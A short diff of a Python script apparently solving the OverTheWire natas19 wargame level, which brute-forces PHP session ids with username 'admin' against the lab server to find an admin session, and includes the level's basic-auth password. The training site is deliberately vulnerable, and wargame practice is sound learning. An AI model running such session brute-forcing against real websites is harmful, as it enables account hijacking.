@@ -24,12 +24,12 @@ while search == True:
         Data = {'username' : 'admin', 'PHPSESSID' : sessionidhex }
         r = requests.post('http://natas19.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), data = Data)
         length = len(r.content)
-        sessionid_list[sessionid]= length
+        sessionid_list[sessionid]= len(r.content)
         #print(f'testing session id:  {sessionid} , hex: {sessionidhex} ')
         #print(Data)
-        if length >= a_len:
+        if length > a_len:
                 password = sessionid 
+                a_len = len(r.content)
                 
     print(password)            
     break
-        
